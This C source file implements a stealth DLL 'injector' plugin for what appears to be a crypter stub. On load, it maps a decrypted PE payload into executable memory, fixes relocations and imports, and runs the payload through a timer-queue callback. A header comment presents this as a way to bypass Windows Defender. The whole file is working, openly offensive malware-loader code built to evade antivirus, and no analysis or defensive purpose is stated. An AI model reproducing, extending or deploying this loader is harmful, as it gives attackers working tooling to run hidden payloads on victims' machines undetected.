// STEALTH In-Process Timer Queue Injector
// Stage: PREINJECT
// Purpose: Execute payload in-process using timer queue callback
//
// This injector:
// 1. Gets decrypted payload from stub
// 2. If PE: maps into memory, resolves imports, gets entry point
// 3. Uses CreateTimerQueueTimer to execute entry point (stealthier than direct
// call)
// 4. Signals injection handled so stub can proceed to POSTLAUNCH
//
// Based on docs: In-process + Timer callbacks = 100% WD bypass

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>


// Stub API types
typedef struct {
  void *data;
  size_t size;
  BOOL is_pe;
  BOOL in_memory_mode;
} StealthPayload;

typedef StealthPayload *(*pfnGetPayload)(void);
typedef void (*pfnSetInjectionHandled)(void);

static pfnGetPayload g_GetPayload = NULL;
static pfnSetInjectionHandled g_SetInjectionHandled = NULL;

static int g_debug = 0;
static void *g_imageBase = NULL;
static DWORD g_entryRVA = 0;
static volatile BOOL g_executed = FALSE;

static void init_debug() {
  char *debug = getenv("STEALTH_INJECTOR_DEBUG");
  g_debug = (debug && debug[0]);
}

static void log_msg(const char *msg) {
  if (!g_debug)
    return;
  char path[MAX_PATH];
  GetTempPathA(sizeof(path), path);
  strcat(path, "stealth_injector.log");
  FILE *f = fopen(path, "a");
  if (f) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    fprintf(f, "[%02d:%02d:%02d] [TIMERQ-PE] %s\n", st.wHour, st.wMinute,
            st.wSecond, msg);
    fclose(f);
  }
}

static BOOL ResolveStubExports(void) {
  HMODULE hStub = GetModuleHandleA(NULL);
  if (!hStub)
    return FALSE;

  g_GetPayload = (pfnGetPayload)GetProcAddress(hStub, "stealth_get_payload");
  g_SetInjectionHandled = (pfnSetInjectionHandled)GetProcAddress(
      hStub, "stealth_set_injection_handled");

  return (g_GetPayload != NULL);
}

// Apply PE relocations
static int ApplyRelocations(unsigned char *imageBase,
                            PIMAGE_NT_HEADERS ntHeader, ULONGLONG delta,
                            SIZE_T imageSize) {
  if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
          .Size == 0)
    return 0;

  ULONG relocRva =
      ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
          .VirtualAddress;
  if (relocRva == 0 || relocRva >= imageSize)
    return -1;

  PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(imageBase + relocRva);
  SIZE_T processed = 0;
  SIZE_T dirSize =
      ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
          .Size;

  while (processed < dirSize && reloc->VirtualAddress) {
    if (reloc->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION))
      return -1;

    DWORD numRelocs =
        (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
    WORD *relocData = (WORD *)(reloc + 1);

    for (DWORD i = 0; i < numRelocs; i++) {
      int type = relocData[i] >> 12;
      int offset = relocData[i] & 0xFFF;

      if (type == IMAGE_REL_BASED_DIR64) {
        SIZE_T addrOff = (SIZE_T)reloc->VirtualAddress + offset;
        if (addrOff + sizeof(ULONGLONG) > imageSize)
          return -1;
        ULONGLONG *addr = (ULONGLONG *)(imageBase + addrOff);
        *addr += delta;
      } else if (type == IMAGE_REL_BASED_HIGHLOW) {
        SIZE_T addrOff = (SIZE_T)reloc->VirtualAddress + offset;
        if (addrOff + sizeof(DWORD) > imageSize)
          return -1;
        DWORD *addr = (DWORD *)(imageBase + addrOff);
        *addr += (DWORD)delta;
      }
    }
    processed += reloc->SizeOfBlock;
    reloc = (PIMAGE_BASE_RELOCATION)((BYTE *)reloc + reloc->SizeOfBlock);
  }
  return 0;
}

// Resolve PE imports
static int ResolveImports(unsigned char *imageBase, PIMAGE_NT_HEADERS ntHeader,
                          SIZE_T imageSize) {
  if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
          .Size == 0)
    return 0;

  ULONG importRva =
      ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
          .VirtualAddress;
  if (importRva == 0 || importRva >= imageSize)
    return -1;

  PIMAGE_IMPORT_DESCRIPTOR importDesc =
      (PIMAGE_IMPORT_DESCRIPTOR)(imageBase + importRva);

  while (importDesc->Name) {
    ULONG nameRva = importDesc->Name;
    if (nameRva >= imageSize)
      return -1;

    LPCSTR dllName = (LPCSTR)(imageBase + nameRva);
    HMODULE hDll = LoadLibraryA(dllName);
    if (!hDll)
      return -1;

    PIMAGE_THUNK_DATA thunk =
        (PIMAGE_THUNK_DATA)(imageBase + importDesc->FirstThunk);

    while (thunk->u1.AddressOfData) {
      if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
        thunk->u1.Function = (ULONGLONG)GetProcAddress(
            hDll, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));
      } else {
        ULONG importByNameRva = (ULONG)thunk->u1.AddressOfData;
        if (importByNameRva >= imageSize)
          return -1;
        PIMAGE_IMPORT_BY_NAME importByName =
            (PIMAGE_IMPORT_BY_NAME)(imageBase + importByNameRva);
        thunk->u1.Function =
            (ULONGLONG)GetProcAddress(hDll, importByName->Name);
      }
      if (!thunk->u1.Function)
        return -1;
      thunk++;
    }
    importDesc++;
  }
  return 0;
}

// Timer callback - executes PE entry point
static VOID CALLBACK TimerCallback(PVOID lpParameter,
                                   BOOLEAN TimerOrWaitFired) {
  log_msg("Timer callback triggered - executing entry point");

  if (!g_imageBase || g_entryRVA == 0) {
    log_msg("ERROR: No entry point");
    return;
  }

  typedef int(WINAPI * EntryPoint_t)(HINSTANCE, HINSTANCE, LPSTR, int);
  EntryPoint_t entry = (EntryPoint_t)((BYTE *)g_imageBase + g_entryRVA);

  char buf[128];
  sprintf(buf, "Calling entry at %p", (void *)entry);
  log_msg(buf);

  // Call entry point (WinMain style for GUI apps)
  int result = entry((HINSTANCE)g_imageBase, NULL, GetCommandLineA(), SW_SHOW);

  sprintf(buf, "Entry returned: %d", result);
  log_msg(buf);

  g_executed = TRUE;
}

// Map PE and execute via timer
static BOOL ExecutePEViaTimer(void *peData, size_t peSize) {
  char buf[256];

  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData;
  if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
    log_msg("ERROR: Invalid DOS signature");
    return FALSE;
  }

  PIMAGE_NT_HEADERS ntHeader =
      (PIMAGE_NT_HEADERS)((BYTE *)peData + dosHeader->e_lfanew);
  if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
    log_msg("ERROR: Invalid NT signature");
    return FALSE;
  }

  SIZE_T imageSize = ntHeader->OptionalHeader.SizeOfImage;
  sprintf(buf, "PE image size: %zu", imageSize);
  log_msg(buf);

  // Allocate memory for mapped PE
  g_imageBase = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE,
                             PAGE_EXECUTE_READWRITE);
  if (!g_imageBase) {
    log_msg("ERROR: VirtualAlloc failed");
    return FALSE;
  }

  sprintf(buf, "Allocated image at %p", g_imageBase);
  log_msg(buf);

  // Copy headers
  memcpy(g_imageBase, peData, ntHeader->OptionalHeader.SizeOfHeaders);

  // Copy sections
  PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeader);
  for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
    if (section[i].SizeOfRawData > 0) {
      memcpy((BYTE *)g_imageBase + section[i].VirtualAddress,
             (BYTE *)peData + section[i].PointerToRawData,
             section[i].SizeOfRawData);
    }
  }
  log_msg("Sections copied");

  // Apply relocations
  ULONGLONG delta = (ULONGLONG)g_imageBase - ntHeader->OptionalHeader.ImageBase;
  if (delta != 0) {
    if (ApplyRelocations((unsigned char *)g_imageBase, ntHeader, delta,
                         imageSize) != 0) {
      log_msg("ERROR: Relocations failed");
      VirtualFree(g_imageBase, 0, MEM_RELEASE);
      return FALSE;
    }
    log_msg("Relocations applied");
  }

  // Resolve imports
  if (ResolveImports((unsigned char *)g_imageBase, ntHeader, imageSize) != 0) {
    log_msg("ERROR: Imports failed");
    VirtualFree(g_imageBase, 0, MEM_RELEASE);
    return FALSE;
  }
  log_msg("Imports resolved");

  // Store entry point
  g_entryRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
  sprintf(buf, "Entry point RVA: 0x%lx", g_entryRVA);
  log_msg(buf);

  // Create timer queue for execution
  HANDLE hTimerQueue = CreateTimerQueue();
  if (!hTimerQueue) {
    log_msg("ERROR: CreateTimerQueue failed");
    VirtualFree(g_imageBase, 0, MEM_RELEASE);
    return FALSE;
  }

  HANDLE hTimer = NULL;
  if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, TimerCallback, NULL, 50, 0,
                             0)) {
    log_msg("ERROR: CreateTimerQueueTimer failed");
    DeleteTimerQueue(hTimerQueue);
    VirtualFree(g_imageBase, 0, MEM_RELEASE);
    return FALSE;
  }

  log_msg("Timer scheduled - waiting for execution");

  // Wait for timer to complete
  Sleep(5000); // Give payload time to run

  // Cleanup timer (but not image memory - payload might still be running)
  DeleteTimerQueueTimer(hTimerQueue, hTimer, INVALID_HANDLE_VALUE);
  DeleteTimerQueue(hTimerQueue);

  return g_executed;
}

// Main injection function
static BOOL PerformInjection(void) {
  log_msg("=== In-Process Timer Queue Injector ===");

  if (!ResolveStubExports()) {
    log_msg("ERROR: Could not resolve stub exports");
    return FALSE;
  }

  StealthPayload *payload = g_GetPayload();
  if (!payload) {
    log_msg("ERROR: No payload available");
    return FALSE;
  }

  char buf[256];
  sprintf(buf, "Payload: %zu bytes, is_pe=%d", payload->size, payload->is_pe);
  log_msg(buf);

  BOOL success = FALSE;

  if (payload->is_pe) {
    log_msg("Executing PE via timer queue");
    success = ExecutePEViaTimer(payload->data, payload->size);
  } else {
    log_msg("Shellcode execution not implemented yet");
    // For shellcode: just allocate RWX, copy, and call via timer
  }

  if (success) {
    log_msg("SUCCESS: Payload executed via timer queue");
    if (g_SetInjectionHandled) {
      g_SetInjectionHandled();
    }
  }

  return success;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    DisableThreadLibraryCalls(hinstDLL);
    init_debug();
    log_msg("Plugin loaded");
    PerformInjection();
  }
  return TRUE;
}
